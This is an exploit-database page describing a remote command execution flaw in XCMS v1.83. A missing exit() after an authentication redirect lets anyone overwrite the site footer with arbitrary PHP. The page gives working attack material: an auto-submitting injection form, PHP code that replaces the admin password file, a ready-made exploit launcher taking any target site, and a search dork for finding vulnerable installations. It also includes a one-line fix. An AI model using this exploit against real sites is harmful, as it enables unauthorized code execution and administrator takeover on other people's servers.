---
title: XCMS v1.83 Remote Command Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2023040008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:10.010351
---

# XCMS v1.83 Remote Command Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **XCMS v1.83 Remote Command Execution (RCE)** **2023.04.02**  Credit:  **[Onurcan](https://cxsecurity.com/author/Onurcan/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

Exploit Title: XCMS v1.83 - Remote Command Execution (RCE)
Author: Onurcan
Email: onurcanalcan@gmail.com
Site: ihteam.net
Script Download : http://www.xcms.it
Date: 26/12/2022
The xcms's footer(that is in "/dati/generali/footer.dtb") is included in each page of the xcms.
Taking "home.php" for example:
<?php
//home.php
[...]
include(CSTR."footer".STR); // <- "CSTR" and "STR" are the constants previously declared. They refers to "/dati/generali" and "dtb"
?>
So the xcms allow you to modify the footer throught a bugged page called cpie.php included in the admin panel.
So let's take a look to the bugged code.
<?php
//cpie.php
[...]
if(isset($\_SESSION['logadmin'])===false){ header("location:index.php"); } // <- so miss an exit() :-D
[...]
if(isset($\_POST['salva'])){
Scrivi(CGEN."footer".DTB,stripslashes($\_POST['testo\_0'])); // <- save the changements without any kind of control
}
[...]
?>
So with a simple html form we can change the footer.
Ex:
<form name="editor" action="http://[SITE\_WITH\_XCMS]/index.php?lng=it&pg=admin&s=cpie" method="post">
<input type="hidden" name="salva" value="OK" />
<textarea name="testo\_0"><?php YOUR PHP CODE ?></textarea>
<input type="submit" value="Modifica" />
</form>
<script>document.editor.submit()</script>
Note: This is NOT a CSRF, this is just an example to change the footer without the admin credentials.
Trick: We can change the admin panel password by inserting this code in the footer:
<?php
$pwd = "owned"; // <- Place here your new password.
$pwd2 = md5($pwd);
unlink("dati/generali/pass.php");
$f = fopen("dati/generali/pass.php",w);
fwrite($f,"<?php \$mdp = \"$pwd2\"; ?>");
fclose($f);
?>
This code delete the old password file and then create a new one with your new password.
Fix:
<?php
//cpie.php
[...]
if(isset($\_SESSION['logadmin'])===false){ header("location:index.php"); exit(); } // with an exit() we can fix the bug.
[...]
if(isset($\_POST['salva'])){
Scrivi(CGEN."footer".DTB,stripslashes($\_POST['testo\_0'])); // <- save the changements without any kind of control
}
[...]
?>
So this is a simple exploit:
<?php
if(isset($\_POST['send']) and isset($\_POST['code']) and isset($\_POST['site'])){
echo "
<form name=\"editor\" action=\"http://".$\_POST['site']."/index.php?lng=it&pg=admin&s=cpie\" method=\"post\">
<input type=\"hidden\" name=\"salva\" value=\"OK\" />
<textarea name=\"testo\_0\">".$\_POST['code']."</textarea>
<input type=\"submit\" value=\"Modifica\" />
</form>
<script>document.editor.submit()</script>";
}else{
echo"
<pre>
XCMS <= v1.82 Remote Command Execution Vulnerability
Dork : inurl:\"mod=notizie\"
by Onurcan
Visit ihteam.net
</pre>
<form method=POST action=".$\_POST['PHP\_SELF'].">
<pre>
Site :
<input type=text name=site />
Code :
<textarea name=code cols=49 rows=14>Your code here</textarea>
<input type=submit value=Exploit />
<input type=hidden name=\"send\" />
</pre>
</form>";
}
?>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top